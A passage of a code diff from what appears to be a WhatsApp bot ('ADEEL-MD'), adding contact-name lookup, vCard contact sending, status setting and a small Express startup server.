+      conn.relayMessage(jid, template.message, { messageId: template.key.id })
+    }
+    //=====================================================
+    conn.getName = (jid, withoutContact = false) => {
+            id = conn.decodeJid(jid);
+            withoutContact = conn.withoutContact || withoutContact;
+            let v;
+            if (id.endsWith('@g.us'))
+                return new Promise(async resolve => {
+                    v = store.contacts[id] || {};
+                    if (!(v.name || v.notify || v.subject))
+                        v = conn.groupMetadata(id) || {};
+                    resolve(
+                        v.name ||
+                            v.subject ||
+                            PhoneNumber(
+                                '+' + id.replace('@s.whatsapp.net', ''),
+                            ).getNumber('international'),
+                    );
+                });
+            else
+                v =
+                    id === '0@s.whatsapp.net'
+                        ? { id, name: 'WhatsApp' }
+                        : id === conn.decodeJid(conn.user.id)
+                        ? conn.user
+                        : store.contacts[id] || {};
+            return (
+                (withoutContact ? '' : v.name) ||
+                v.subject ||
+                v.verifiedName ||
+                PhoneNumber(
+                    '+' + jid.replace('@s.whatsapp.net', ''),
+                ).getNumber('international')
+            );
+        };
+
+        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
+            let list = [];
+            for (let i of kon) {
+                list.push({
+                    displayName: await conn.getName(i + '@s.whatsapp.net'),
+                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
+                        i + '@s.whatsapp.net',
+                    )}\nFN:${
+                        global.OwnerName
+                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
+                        global.email
+                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
+                        global.github
+                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                        global.location
+                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+                });
+            }
+            conn.sendMessage(
+                jid,
+                {
+                    contacts: {
+                        displayName: `${list.length} Contact`,
+                        contacts: list,
+                    },
+                    ...opts,
+                },
+                { quoted },
+            );
+        };
+
+        conn.setStatus = status => {
+            conn.query({
+                tag: 'iq',
+                attrs: {
+                    to: '@s.whatsapp.net',
+                    type: 'set',
+                    xmlns: 'status',
+                },
+                content: [
+                    {
+                        tag: 'status',
+                        attrs: {},
+                        content: Buffer.from(status, 'utf-8'),
+                    },
+                ],
+            });
+            return status;
+        };
+    conn.serializeM = mek => sms(conn, mek, store);
+  }
+  
+  app.get("/", (req, res) => {
+  res.send("ADEEL-MD STARTED ✅");
+  });
+  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+  setTimeout(() => {
+  connectToWA()
+  }, 4000);
